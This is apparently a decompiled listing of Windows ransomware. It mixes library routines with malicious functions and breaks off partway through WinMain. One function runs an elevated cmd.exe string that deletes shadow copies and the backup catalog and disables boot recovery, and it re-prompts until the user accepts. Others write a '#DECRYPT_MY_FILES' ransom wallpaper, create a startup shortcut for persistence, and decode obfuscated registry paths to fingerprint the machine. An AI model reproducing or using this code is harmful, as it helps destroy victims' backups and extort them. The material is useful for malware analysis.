  unsigned __int8 v15; // dl
  int v16; // eax
  _DWORD *v17; // ecx
  unsigned __int8 *v18; // edx
  int v19; // eax
  int v20; // ecx
  int v21; // edx
  int v22; // eax
  int v23; // ecx
  unsigned __int8 v24; // dl
  int v25; // eax
  _DWORD *v26; // ecx
  unsigned __int8 *v27; // edx
  int v28; // eax
  int v29; // eax
  char *v30; // ecx
  int v31; // edx
  char v32; // al
  char v33; // al
  _BYTE *v34; // esi
  int v35; // ecx
  int v37; // [esp+0h] [ebp-3Ch] BYREF
  _BYTE *v38; // [esp+10h] [ebp-2Ch]
  bool v39; // [esp+14h] [ebp-28h]
  char *v40; // [esp+1Ch] [ebp-20h]
  int v41; // [esp+20h] [ebp-1Ch]
  int v42; // [esp+24h] [ebp-18h]
  unsigned __int8 v43; // [esp+2Bh] [ebp-11h]
  int *v44; // [esp+2Ch] [ebp-10h]
  int v45; // [esp+38h] [ebp-4h]

  v44 = &v37;
  v42 = a2;
  v4 = *(_DWORD *)a1;
  v5 = 0;
  v40 = a1;
  v41 = 0;
  v6 = *(_DWORD *)(v4 + 4);
  v7 = *(_DWORD *)&a1[v6 + 32];
  if ( *(__int64 *)&a1[v6 + 32] <= 0 || v7 <= a3 )
    v8 = 0;
  else
    v8 = v7 - a3;
  v9 = *(_DWORD *)&a1[v6 + 56];
  v38 = a1;
  if ( v9 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v9 + 4))(v9);
  v45 = 0;
  v10 = *(_DWORD *)(*(_DWORD *)a1 + 4);
  if ( !*(_DWORD *)&a1[v10 + 12] )
  {
    v11 = *(char **)&a1[v10 + 60];
    if ( v11 )
    {
      if ( v11 != a1 )
        sub_40BE10(v11);
    }
  }
  v12 = *(_DWORD *)(*(_DWORD *)a1 + 4);
  v39 = *(_DWORD *)&a1[v12 + 12] == 0;
  v45 = 1;
  if ( v39 )
  {
    LOBYTE(v45) = 2;
    if ( (*(_DWORD *)&a1[v12 + 20] & 0x1C0) != 64 )
    {
      while ( v8 )
      {
        v13 = *(_DWORD *)(*(_DWORD *)a1 + 4);
        v14 = *(_DWORD *)&a1[v13 + 56];
        v15 = a1[v13 + 64];
        v43 = v15;
        if ( **(_DWORD **)(v14 + 32) && (v16 = **(_DWORD **)(v14 + 48), v16 > 0) )
        {
          **(_DWORD **)(v14 + 48) = v16 - 1;
          v17 = *(_DWORD **)(v14 + 32);
          v18 = (unsigned __int8 *)(*v17)++;
          LOBYTE(v19) = v43;
          *v18 = v43;
          v19 = (unsigned __int8)v19;
        }
        else
        {
          v19 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v14 + 12))(v14, v15);
        }
        if ( v19 == -1 )
        {
          v5 = 4;
          v41 = 4;
          goto LABEL_24;
        }
        --v8;
      }
    }
    v20 = *(_DWORD *)&a1[*(_DWORD *)(*(_DWORD *)a1 + 4) + 56];
    if ( (*(int (__thiscall **)(int, int, unsigned int, _DWORD))(*(_DWORD *)v20 + 36))(v20, v42, a3, 0) != a3 || v21 )
    {
      v5 = 4;
    }
    else
    {
LABEL_24:
      while ( v8 )
      {
        v22 = *(_DWORD *)(*(_DWORD *)a1 + 4);
        v23 = *(_DWORD *)&a1[v22 + 56];
        v24 = a1[v22 + 64];
        v43 = v24;
        if ( **(_DWORD **)(v23 + 32) && (v25 = **(_DWORD **)(v23 + 48), v25 > 0) )
        {
          **(_DWORD **)(v23 + 48) = v25 - 1;
          v26 = *(_DWORD **)(v23 + 32);
          v27 = (unsigned __int8 *)(*v26)++;
          LOBYTE(v28) = v43;
          *v27 = v43;
          v28 = (unsigned __int8)v28;
        }
        else
        {
          v28 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v23 + 12))(v23, v24);
        }
        if ( v28 == -1 )
        {
          v5 |= 4u;
          break;
        }
        --v8;
      }
    }
    v29 = *(_DWORD *)(*(_DWORD *)a1 + 4);
    *(_DWORD *)&a1[v29 + 32] = 0;
    *(_DWORD *)&a1[v29 + 36] = 0;
    v45 = 1;
  }
  else
  {
    v5 = 4;
  }
  v30 = &a1[*(_DWORD *)(*(_DWORD *)a1 + 4)];
  if ( v5 )
  {
    v31 = v5 | *((_DWORD *)v30 + 3);
    v32 = v31 | 4;
    if ( *((_DWORD *)v30 + 14) )
      v32 = v31;
    sub_4043E0(v30, v32, 0);
  }
  v45 = 4;
  v33 = j____uncaught_exception(v30);
  v34 = v38;
  if ( !v33 )
    sub_40BEE0(v38);
  LOBYTE(v45) = 5;
  v35 = *(_DWORD *)&v34[*(_DWORD *)(*(_DWORD *)v34 + 4) + 56];
  if ( v35 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v35 + 8))(v35);
  return a1;
}
// 40CA62: variable 'v21' is possibly undefined
// 40CB37: variable 'v30' is possibly undefined
// 41398B: using guessed type int __fastcall j____uncaught_exception(_DWORD);

//----- (0040CB80) --------------------------------------------------------
unsigned int __thiscall sub_40CB80(_DWORD *this)
{
  _DWORD *v2; // edx
  int v3; // esi
  int v4; // ecx
  unsigned int v5; // ecx
  _DWORD *v6; // esi
  int v7; // ebx
  int v8; // ecx
  unsigned int v9; // ecx
  int *v10; // esi
  int v11; // ebx
  int v12; // ecx
  unsigned int v13; // ecx
  unsigned int v14; // edx
  int v15; // edx
  unsigned int v16; // edx

  if ( *this == 624 )
  {
    v2 = this + 2;
    v3 = 624;
    do
    {
      v4 = *(v2++ - 1);
      v5 = *(v2 - 2) ^ (*(v2 - 1) ^ v4) & 0x7FFFFFFF;
      v2[622] = (v5 >> 1) ^ v2[395] ^ ((v5 & 1) != 0 ? 0x9908B0DF : 0);
      --v3;
    }
    while ( v3 );
  }
  else if ( *this >= 0x4E0u )
  {
    v6 = this + 625;
    v7 = 227;
    do
    {
      v8 = v6[1];
      ++v6;
      v9 = *(v6 - 1) ^ (*(v6 - 1) ^ v8) & 0x7FFFFFFF;
      *(v6 - 625) = (v9 >> 1) ^ v6[396] ^ ((v9 & 1) != 0 ? 0x9908B0DF : 0);
      --v7;
    }
    while ( v7 );
    v10 = this + 852;
    v11 = 396;
    do
    {
      v12 = *v10++;
      v13 = *(v10 - 1) ^ (*v10 ^ v12) & 0x7FFFFFFF;
      *(v10 - 625) = (v13 >> 1) ^ *(v10 - 852) ^ ((v13 & 1) != 0 ? 0x9908B0DF : 0);
      --v11;
    }
    while ( v11 );
    this[624] = ((this[1248] ^ (this[1] ^ this[1248]) & 0x7FFFFFFFu) >> 1) ^ this[397] ^ ((this[1] & 1) != 0
                                                                                        ? 0x9908B0DF
                                                                                        : 0);
    *this = 0;
  }
  v14 = this[++*this];
  v15 = (v14 >> 11) & this[1249] ^ v14;
  v16 = (((((v15 & 0xFF3A58AD) << 7) ^ v15) & 0xFFFFDF8C) << 15) ^ ((v15 & 0xFF3A58AD) << 7) ^ v15;
  return v16 ^ (v16 >> 18);
}

//----- (0040CCD0) --------------------------------------------------------
_DWORD *__thiscall sub_40CCD0(_DWORD *this, _DWORD *a2, char a3, _DWORD *a4, int a5, int a6)
{
  _DWORD *v7; // eax
  _DWORD *v8; // esi
  int v9; // eax
  _DWORD *v10; // eax
  int *v11; // ecx
  _DWORD *v12; // edx
  _DWORD *v13; // esi
  int v14; // edi
  _DWORD *v15; // edx
  _DWORD *v16; // ecx
  _DWORD *v17; // edx
  _DWORD *v18; // esi
  int v19; // ecx
  _DWORD *v20; // ecx
  int v21; // edx
  int v22; // ecx
  _DWORD *v23; // ecx
  _DWORD *v24; // ecx
  _DWORD *result; // eax
  _DWORD *v26; // [esp+1Ch] [ebp+14h]

  if ( this[1] >= 0x6666665u )
    sub_41349F((int)"map/set<T> too long");
  v7 = sub_40CEE0(this, a5);
  ++this[1];
  v8 = v7;
  v26 = v7;
  v7[1] = a4;
  if ( a4 == (_DWORD *)*this )
  {
    *(_DWORD *)(*this + 4) = v7;
    *(_DWORD *)*this = v7;
    v9 = *this;
LABEL_8:
    *(_DWORD *)(v9 + 8) = v8;
    goto LABEL_9;
  }
  if ( !a3 )
  {
    a4[2] = v7;
    v9 = *this;
    if ( a4 != *(_DWORD **)(*this + 8) )
      goto LABEL_9;
    goto LABEL_8;
  }
  *a4 = v7;
  if ( a4 == *(_DWORD **)*this )
    *(_DWORD *)*this = v7;
LABEL_9:
  v10 = v8;
  if ( !*(_BYTE *)(v8[1] + 12) )
  {
    while ( 1 )
    {
      v11 = (int *)v10[1];
      v12 = v10 + 1;
      v13 = v11 + 1;
      v14 = *(_DWORD *)v11[1];
      if ( v11 == (int *)v14 )
      {
        v14 = *(_DWORD *)(*v13 + 8);
        if ( *(_BYTE *)(v14 + 12) )
        {
          if ( v10 == (_DWORD *)v11[2] )
          {
            v10 = (_DWORD *)v10[1];
            v15 = (_DWORD *)v11[2];
            v11[2] = *v15;
            if ( !*(_BYTE *)(*v15 + 13) )
              *(_DWORD *)(*v15 + 4) = v11;
            v15[1] = *v13;
            if ( v11 == *(int **)(*this + 4) )
            {
              *(_DWORD *)(*this + 4) = v15;
            }
            else
            {
              v16 = (_DWORD *)*v13;
              if ( v10 == *(_DWORD **)*v13 )
                *v16 = v15;
              else
                v16[2] = v15;
            }
            *v15 = v10;
            *v13 = v15;
            v12 = v13;
          }
          *(_BYTE *)(*v12 + 12) = 1;
          *(_BYTE *)(*(_DWORD *)(*v12 + 4) + 12) = 0;
          v17 = *(_DWORD **)(*v12 + 4);
          v18 = (_DWORD *)*v17;
          *v17 = *(_DWORD *)(*v17 + 8);
          v19 = v18[2];
          if ( !*(_BYTE *)(v19 + 13) )
            *(_DWORD *)(v19 + 4) = v17;
          v18[1] = v17[1];
          if ( v17 == *(_DWORD **)(*this + 4) )
          {
            *(_DWORD *)(*this + 4) = v18;
            v18[2] = v17;
          }
          else
          {
            v20 = (_DWORD *)v17[1];
            if ( v17 == (_DWORD *)v20[2] )
              v20[2] = v18;
            else
              *v20 = v18;
            v18[2] = v17;
          }
LABEL_48:
          v17[1] = v18;
          goto LABEL_49;
        }
      }
      else if ( *(_BYTE *)(v14 + 12) )
      {
        if ( v10 == (_DWORD *)*v11 )
        {
          v10 = (_DWORD *)v10[1];
          v21 = *v11;
          *v11 = *(_DWORD *)(*v11 + 8);
          v22 = *(_DWORD *)(v21 + 8);
          if ( !*(_BYTE *)(v22 + 13) )
            *(_DWORD *)(v22 + 4) = v10;
          *(_DWORD *)(v21 + 4) = *v13;
          if ( v10 == *(_DWORD **)(*this + 4) )
          {
            *(_DWORD *)(*this + 4) = v21;
          }
          else
          {
            v23 = (_DWORD *)*v13;
            if ( v10 == *(_DWORD **)(*v13 + 8) )
              v23[2] = v21;
            else
              *v23 = v21;
          }
          *(_DWORD *)(v21 + 8) = v10;
          *v13 = v21;
          v12 = v13;
        }
        *(_BYTE *)(*v12 + 12) = 1;
        *(_BYTE *)(*(_DWORD *)(*v12 + 4) + 12) = 0;
        v17 = *(_DWORD **)(*v12 + 4);
        v18 = (_DWORD *)v17[2];
        v17[2] = *v18;
        if ( !*(_BYTE *)(*v18 + 13) )
          *(_DWORD *)(*v18 + 4) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_DWORD **)(*this + 4) )
        {
          *(_DWORD *)(*this + 4) = v18;
        }
        else
        {
          v24 = (_DWORD *)v17[1];
          if ( v17 == (_DWORD *)*v24 )
            *v24 = v18;
          else
            v24[2] = v18;
        }
        *v18 = v17;
        goto LABEL_48;
      }
      *((_BYTE *)v11 + 12) = 1;
      *(_BYTE *)(v14 + 12) = 1;
      *(_BYTE *)(*(_DWORD *)(*v12 + 4) + 12) = 0;
      v10 = *(_DWORD **)(*v12 + 4);
LABEL_49:
      if ( *(_BYTE *)(v10[1] + 12) )
      {
        v8 = v26;
        break;
      }
    }
  }
  *(_BYTE *)(*(_DWORD *)(*this + 4) + 12) = 1;
  result = a2;
  *a2 = v8;
  return result;
}

//----- (0040CEE0) --------------------------------------------------------
_DWORD *__thiscall sub_40CEE0(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  result = sub_40CF30(this);
  *((_WORD *)result + 6) = 0;
  result[8] = 0;
  result[9] = 0;
  *((_OWORD *)result + 1) = *(_OWORD *)a2;
  *((_QWORD *)result + 4) = *(_QWORD *)(a2 + 16);
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
  return result;
}

//----- (0040CF30) --------------------------------------------------------
_DWORD *__thiscall sub_40CF30(_DWORD *this)
{
  _DWORD *result; // eax

  result = operator new(0x28u);
  *result = *this;
  result[1] = *this;
  result[2] = *this;
  return result;
}

//----- (0040CF4D) --------------------------------------------------------
char *__thiscall sub_40CF4D(_DWORD *this, char a2)
{
  return sub_40B080((struct std::ios_base *)((char *)this - *(this - 1)), a2);
}

//----- (0040CF55) --------------------------------------------------------
char *__thiscall sub_40CF55(_DWORD *this, char a2)
{
  return sub_40AED0((struct std::ios_base *)((char *)this - *(this - 1)), a2);
}

//----- (0040CF5D) --------------------------------------------------------
char *__thiscall sub_40CF5D(_DWORD *this, char a2)
{
  return sub_40B150((struct std::ios_base *)((char *)this - *(this - 1)), a2);
}

//----- (0040CF65) --------------------------------------------------------
char *__thiscall sub_40CF65(_DWORD *this, char a2)
{
  return sub_40AE20((struct std::ios_base *)((char *)this - *(this - 1)), a2);
}

//----- (0040CF6D) --------------------------------------------------------
char *__thiscall sub_40CF6D(_DWORD *this, char a2)
{
  return sub_40AFC0((struct std::ios_base *)((char *)this - *(this - 1)), a2);
}

//----- (0040CF75) --------------------------------------------------------
char *__thiscall sub_40CF75(_DWORD *this, char a2)
{
  return sub_40ADF0((_DWORD *)((char *)this - *(this - 1)), a2);
}

//----- (0040CF80) --------------------------------------------------------
int __fastcall sub_40CF80(int *a1, int a2, int a3, int a4, int a5)
{
  _DWORD *v5; // eax
  int result; // eax

  v5 = sub_401FB0();
  result = sub_41BF6C(*v5 | 1, v5[1], a1, a2, a3, 0, a5);
  if ( result < 0 )
    return -1;
  return result;
}

//----- (0040CFC0) --------------------------------------------------------
int __thiscall sub_40CFC0(LPCRITICAL_SECTION lpCriticalSection)
{
  int result; // eax

  if ( InitializeCriticalSectionEx(lpCriticalSection, 0, 0) )
    return 0;
  result = GetLastError();
  if ( result > 0 )
    return (unsigned __int16)result | 0x80070000;
  return result;
}

//----- (0040CFF0) --------------------------------------------------------
int __cdecl sub_40CFF0(int *a1, int a2, int a3, int a4)
{
  int result; // eax
  int v5; // ebx
  unsigned int v6; // esi
  _DWORD *v7; // eax
  int v8; // eax

  result = 0;
  if ( a2 <= 0 )
    result = -2147024809;
  if ( result < 0 )
  {
    if ( a2 )
      *(_BYTE *)a1 = 0;
  }
  else
  {
    v5 = 0;
    v6 = a2 - 1;
    v7 = sub_401FB0();
    v8 = sub_41BF6C(*v7 | 1, v7[1], a1, a2 - 1, a3, 0, (int)&a4);
    if ( v8 < 0 )
      v8 = -1;
    if ( v8 < 0 || v8 > v6 )
    {
      *((_BYTE *)a1 + v6) = 0;
      return -2147024774;
    }
    else if ( v8 == v6 )
    {
      *((_BYTE *)a1 + v6) = 0;
      return 0;
    }
    return v5;
  }
  return result;
}

//----- (0040D080) --------------------------------------------------------
char **__fastcall sub_40D080(char **a1, const CHAR *lpSubKey, LPCSTR lpValueName)
{
  bool v4; // cf
  const CHAR *v5; // esi
  LSTATUS v6; // esi
  int i; // ecx
  char **v8; // eax
  HKEY phkResult; // [esp+10h] [ebp-434h] BYREF
  DWORD cbData; // [esp+14h] [ebp-430h] BYREF
  char *v12[4]; // [esp+18h] [ebp-42Ch] BYREF
  int v13; // [esp+28h] [ebp-41Ch]
  unsigned int v14; // [esp+2Ch] [ebp-418h]
  BYTE Data[1024]; // [esp+30h] [ebp-414h] BYREF
  int v16; // [esp+440h] [ebp-4h]

  cbData = (DWORD)a1;
  v4 = *((_DWORD *)lpSubKey + 5) < 0x10u;
  v5 = lpValueName;
  cbData = 1024;
  if ( !v4 )
    lpSubKey = *(const CHAR **)lpSubKey;
  if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 1u, &phkResult) )
    goto LABEL_14;
  if ( *((_DWORD *)lpValueName + 5) >= 0x10u )
    v5 = *(const CHAR **)lpValueName;
  v6 = RegQueryValueExA(phkResult, v5, 0, 0, Data, &cbData);
  RegCloseKey(phkResult);
  if ( v6 || cbData > 0x400 )
  {
LABEL_14:
    a1[4] = 0;
    a1[5] = (char *)15;
    *(_BYTE *)a1 = 0;
  }
  else
  {
    v13 = 0;
    v14 = 15;
    LOBYTE(v12[0]) = 0;
    sub_401D10(v12, Data, cbData - 1);
    v16 = 0;
    for ( i = v13; i; --i )
    {
      v8 = v12;
      if ( v14 >= 0x10 )
        v8 = (char **)v12[0];
      if ( *((_BYTE *)v8 + i - 1) )
        break;
    }
    sub_403420(v12, a1, 0, i);
    sub_401970(v12);
  }
  return a1;
}

//----- (0040D1F0) --------------------------------------------------------
int sub_40D1F0()
{
  int result; // eax
  SHELLEXECUTEINFOA pExecInfo; // [esp+0h] [ebp-40h] BYREF

  pExecInfo.cbSize = 60;
  pExecInfo.fMask = 0;
  pExecInfo.hwnd = 0;
  pExecInfo.lpVerb = "runas";
  pExecInfo.lpFile = "cmd.exe";
  pExecInfo.lpParameters = "/C vssadmin.exe delete shadows /all /quiet & wmic.exe shadowcopy delete & bcdedit /set {defau"
                           "lt} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin "
                           "delete catalog -quiet";
  memset(&pExecInfo.lpDirectory, 0, 12);
  result = ShellExecuteExA(&pExecInfo);
  if ( !result )
    return sub_40D1F0();
  return result;
}

//----- (0040D260) --------------------------------------------------------
int sub_40D260()
{
  int v0; // esi
  BYTE pbBuffer[4]; // [esp+8h] [ebp-Ch] BYREF
  HCRYPTPROV phProv; // [esp+Ch] [ebp-8h] BYREF

  phProv = 0;
  CryptAcquireContextA(&phProv, 0, 0, 1u, 0xF0000000);
  v0 = 10;
  do
  {
    CryptGenRandom(phProv, 4u, pbBuffer);
    --v0;
  }
  while ( v0 );
  return *(_DWORD *)pbBuffer;
}

//----- (0040D2D0) --------------------------------------------------------
void __cdecl sub_40D2D0(char *Block, int a2, int a3, int a4, int a5, unsigned int a6)
{
  int v6; // esi
  char *v7; // eax
  const char *p_Block; // eax
  unsigned int v9; // kr00_4
  wchar_t *v10; // esi
  char *v11; // ecx
  unsigned int v12; // eax
  int v13; // [esp+10h] [ebp-228h] BYREF
  LPVOID ppv; // [esp+14h] [ebp-224h] BYREF
  CHAR Filename[264]; // [esp+18h] [ebp-220h] BYREF
  CHAR pszPath[264]; // [esp+120h] [ebp-118h] BYREF
  int v17; // [esp+234h] [ebp-4h]

  v17 = 0;
  GetModuleFileNameA(0, Filename, 0x104u);
  CoInitialize(0);
  ppv = 0;
  v6 = CoCreateInstance(&rclsid, 0, 0x17u, &riid, &ppv);
  *(_DWORD *)((char *)&unk_4529A4 + *(_DWORD *)(dword_452990[0] + 4)) = *(_DWORD *)((_BYTE *)&unk_4529A4
                                                                                  + *(_DWORD *)(dword_452990[0] + 4)) & 0xFFFFF1FF | 0x800;
  v7 = sub_40F1D0((char *)dword_452990, v6);
  sub_410BB0(v7);
  if ( v6 >= 0 )
  {
    (*(void (__stdcall **)(LPVOID, CHAR *))(*(_DWORD *)ppv + 80))(ppv, Filename);
    if ( (**(int (__stdcall ***)(LPVOID, void *, int *))ppv)(ppv, &unk_435310, &v13) >= 0 )
    {
      memset(pszPath, 0, 0x104u);
      SHGetSpecialFolderPathA(0, pszPath, 7, 0);
      strcat_s(pszPath, 0x104u, "\\");
      p_Block = (const char *)&Block;
      if ( a6 >= 0x10 )
        p_Block = Block;
      strcat_s(pszPath, 0x104u, p_Block);
      strcat_s(pszPath, 0x104u, ".lnk");
      v9 = strlen(pszPath);
      v10 = (wchar_t *)unknown_libname_5((unsigned __int64)(v9 + 1) >> 31 != 0 ? -1 : 2 * (v9 + 1));
      mbstowcs(v10, pszPath, v9 + 1);
      (*(void (__stdcall **)(int, wchar_t *, int))(*(_DWORD *)v13 + 24))(v13, v10, 1);
      (*(void (__stdcall **)(int))(*(_DWORD *)v13 + 8))(v13);
      (*(void (__stdcall **)(LPVOID))(*(_DWORD *)ppv + 8))(ppv);
    }
  }
  if ( a6 >= 0x10 )
  {
    v11 = Block;
    if ( a6 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)Block & 0x1F) != 0
        || (v12 = *((_DWORD *)Block - 1), v12 >= (unsigned int)Block)
        || (unsigned int)&Block[-v12] < 4
        || (unsigned int)&Block[-v12] > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v11 = (char *)*((_DWORD *)Block - 1);
    }
    j__free(v11);
  }
}
// 414B29: using guessed type int __cdecl unknown_libname_5(_DWORD);
// 452990: using guessed type int dword_452990[5];

//----- (0040D4F0) --------------------------------------------------------
BOOL sub_40D4F0()
{
  FILE *v0; // esi
  CHAR pszPath[260]; // [esp+4h] [ebp-108h] BYREF

  memset(pszPath, 0, sizeof(pszPath));
  SHGetSpecialFolderPathA(0, pszPath, 16, 0);
  strcat_s(pszPath, 0x104u, "\\#DECRYPT_MY_FILES.BMP");
  v0 = fopen(pszPath, "wb");
  fwrite(&unk_447D88, 1u, 0x9FDFu, v0);
  fclose(v0);
  return SystemParametersInfoA(0x14u, 0, pszPath, 1u);
}

//----- (0040D5A0) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  const CHAR *v4; // eax
  void *v5; // eax
  void *v6; // ecx
  HANDLE hProcess; // eax
  HANDLE v8; // ecx
  void *v9; // eax
  unsigned int v10; // ecx
  const CHAR *v11; // eax
  void *v12; // eax
  void *v13; // ecx
  HANDLE v14; // eax
  HANDLE v15; // ecx
  void *v16; // eax
  unsigned int v17; // ecx
  const CHAR *v18; // eax
  void *v19; // eax
  void *v20; // ecx
  HANDLE v21; // eax
  HANDLE v22; // ecx
  void *v23; // eax
  unsigned int v24; // ecx
  const CHAR *v25; // eax
  void *v26; // eax
  void *v27; // ecx
  HANDLE v28; // eax
  HANDLE v29; // ecx
  void *v30; // eax
  unsigned int v31; // ecx
  void **v32; // eax
  void **v33; // eax
  void **v34; // eax
  void **v35; // eax
  void *v36; // eax
  void *v37; // ecx
  const CHAR *v38; // eax
  unsigned int v39; // edi
  void **v40; // ecx
  void *v41; // esi
  int v42; // edx
  char v43; // al
  HANDLE MutexA; // eax
  HANDLE CurrentProcess; // eax
  char **v46; // eax
  const CHAR *v47; // eax
  void **v48; // ecx
  const CHAR *v49; // esi
  int v50; // edx
  char v51; // al
  LSTATUS v52; // eax
  char **v53; // esi
  int v54; // edi
  HANDLE v55; // esi
  int v56; // esi
  HANDLE v57; // eax
  int v58; // esi
  int v59; // edi
  int v60; // ecx
  void *v61; // eax
  int v62; // edx
  void *v63; // ecx
  int v64; // eax
  void **v65; // eax
  char **v66; // eax
  const char *v67; // eax
  const char *v68; // esi
  char *v69; // eax
  int v70; // ecx
  char *v71; // eax
  char *v72; // eax
  char *v73; // eax
  char *v74; // eax
  char *v75; // eax
  char *v76; // eax
  const char *v77; // eax
  _DWORD *v79[6]; // [esp-48h] [ebp-898h] BYREF
  char *v80; // [esp-30h] [ebp-880h] BYREF
  int v81; // [esp-2Ch] [ebp-87Ch]
  int v82; // [esp-28h] [ebp-878h]
  int v83; // [esp-24h] [ebp-874h]
  size_t v84; // [esp-20h] [ebp-870h]
  unsigned int v85; // [esp-1Ch] [ebp-86Ch] BYREF
  char *v86; // [esp-18h] [ebp-868h] BYREF
  int v87; // [esp-14h] [ebp-864h]
  int v88; // [esp-10h] [ebp-860h]
  unsigned int v89; // [esp-Ch] [ebp-85Ch]
  int v90; // [esp-8h] [ebp-858h]
  char *p_pbDebuggerPresent; // [esp-4h] [ebp-854h]
  LPCSTR lpSubKey; // [esp+8h] [ebp-848h]
  int v93; // [esp+Ch] [ebp-844h]
  int v94; // [esp+10h] [ebp-840h]
  int v95; // [esp+14h] [ebp-83Ch]
  LPCSTR lpName; // [esp+18h] [ebp-838h] BYREF
  HKEY phkResult; // [esp+1Ch] [ebp-834h] BYREF
  SHELLEXECUTEINFOA pExplicitAccess; // [esp+20h] [ebp-830h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+60h] [ebp-7F0h] BYREF
  __int64 v100; // [esp+70h] [ebp-7E0h]
  void *Block[4]; // [esp+80h] [ebp-7D0h] BYREF
  __int64 v102; // [esp+90h] [ebp-7C0h]
  CHAR ValueName[16]; // [esp+A0h] [ebp-7B0h] BYREF
  __int64 v104; // [esp+B0h] [ebp-7A0h]
  DWORD ReturnLength; // [esp+CCh] [ebp-784h] BYREF
  int TokenInformation; // [esp+D0h] [ebp-780h] BYREF
  DWORD VolumeSerialNumber; // [esp+D4h] [ebp-77Ch] BYREF
  BOOL pbDebuggerPresent; // [esp+D8h] [ebp-778h] BYREF
  DWORD nSize; // [esp+DCh] [ebp-774h] BYREF
  void *v110[4]; // [esp+E0h] [ebp-770h] BYREF
  size_t v111; // [esp+F0h] [ebp-760h]
  unsigned int v112; // [esp+F4h] [ebp-75Ch]
  char *v113[6]; // [esp+F8h] [ebp-758h] BYREF
  void *Src[5]; // [esp+110h] [ebp-740h] BYREF
  unsigned int v115; // [esp+124h] [ebp-72Ch]
  char *v116[5]; // [esp+128h] [ebp-728h] BYREF
  unsigned int v117; // [esp+13Ch] [ebp-714h]
  char *Source[4]; // [esp+140h] [ebp-710h] BYREF
  __int64 v119; // [esp+150h] [ebp-700h]
  char *v120[6]; // [esp+168h] [ebp-6E8h] BYREF
  void *v121[6]; // [esp+180h] [ebp-6D0h] BYREF
  void *v122[6]; // [esp+198h] [ebp-6B8h] BYREF
  void *v123[6]; // [esp+1B0h] [ebp-6A0h] BYREF
  void *v124[5]; // [esp+1C8h] [ebp-688h] BYREF
  unsigned int v125; // [esp+1DCh] [ebp-674h]
  int v126[44]; // [esp+1E0h] [ebp-670h] BYREF
  char *v127[6]; // [esp+290h] [ebp-5C0h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+2A8h] [ebp-5A8h] BYREF
  CHAR Buffer[16]; // [esp+318h] [ebp-538h] BYREF
  CHAR FileName[264]; // [esp+328h] [ebp-528h] BYREF
  CHAR pszPath[264]; // [esp+430h] [ebp-420h] BYREF
  CHAR Filename[264]; // [esp+538h] [ebp-318h] BYREF
  int CommandLine[131]; // [esp+640h] [ebp-210h] BYREF
  int savedregs; // [esp+850h] [ebp+0h] BYREF

  nSize = 16;
  GetComputerNameA(Buffer, &nSize);
  v113[4] = 0;
  v113[5] = (char *)15;
  LOBYTE(v113[0]) = 0;
  v104 = 0xF00000000i64;
  ValueName[0] = 0;
  sub_401D10((char **)ValueName, "MachineGuid", 0xBu);
  v100 = 0xF00000000i64;
  LOBYTE(ProcessInformation.hProcess) = 0;
  sub_401D10((char **)&ProcessInformation, "EAEBBBUPHAgPHS03Iz4lLCU6GxMwNz45PDc2NSE5Lw==", 0x2Cu);
  p_pbDebuggerPresent = ValueName;
  sub_402080(&v85, (int *)&ProcessInformation);
  v4 = (const CHAR *)sub_4021A0((_DWORD *)v85, (int)v86, v87, v88, v89, v90);
  sub_40D080((char **)v124, v4, p_pbDebuggerPresent);
  if ( HIDWORD(v102) >= 0x10 )
  {
    v5 = Block[0];
    if ( (unsigned int)(HIDWORD(v102) + 1) >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_167;
      v6 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v6 >= Block[0] || (unsigned int)(Block[0] - v6) < 4 || (unsigned int)(Block[0] - v6) > 0x23 )
        goto LABEL_167;
      v5 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v5);
  }
  v102 = 0xF00000000i64;
  LOBYTE(Block[0]) = 0;
  if ( HIDWORD(v100) >= 0x10 )
  {
    hProcess = ProcessInformation.hProcess;
    if ( (unsigned int)(HIDWORD(v100) + 1) >= 0x1000 )
    {
      if ( ((int)ProcessInformation.hProcess & 0x1F) != 0 )
        goto LABEL_167;
      v8 = (HANDLE)*((_DWORD *)ProcessInformation.hProcess - 1);
      if ( v8 >= ProcessInformation.hProcess
        || (unsigned int)(ProcessInformation.hProcess - v8) < 4
        || (unsigned int)(ProcessInformation.hProcess - v8) > 0x23 )
      {
        goto LABEL_167;
      }
      hProcess = (HANDLE)*((_DWORD *)ProcessInformation.hProcess - 1);
    }
    j__free(hProcess);
  }
  v100 = 0xF00000000i64;
  LOBYTE(ProcessInformation.hProcess) = 0;
  if ( HIDWORD(v104) >= 0x10 )
  {
    v9 = *(void **)ValueName;
    if ( (unsigned int)(HIDWORD(v104) + 1) >= 0x1000 )
    {
      if ( (ValueName[0] & 0x1F) != 0 )
        goto LABEL_167;
      v10 = *(_DWORD *)(*(_DWORD *)ValueName - 4);
      if ( v10 >= *(_DWORD *)ValueName || *(_DWORD *)ValueName - v10 < 4 || *(_DWORD *)ValueName - v10 > 0x23 )
        goto LABEL_167;
      v9 = *(void **)(*(_DWORD *)ValueName - 4);
    }
    j__free(v9);
  }
  v104 = 0xF00000000i64;
  ValueName[0] = 0;
  sub_401D10((char **)ValueName, "ProductId", 9u);
  v100 = 0xF00000000i64;
  LOBYTE(ProcessInformation.hProcess) = 0;
  sub_401D10((char **)&ProcessInformation, "EAEBBBUPHAgPHS03Iz4lLCU6GwcrICoiJCNkGgUNFTYxPCI+NhgrPyA5Kzo=", 0x3Cu);
  p_pbDebuggerPresent = ValueName;
  sub_402080(&v85, (int *)&ProcessInformation);
  v11 = (const CHAR *)sub_4021A0((_DWORD *)v85, (int)v86, v87, v88, v89, v90);
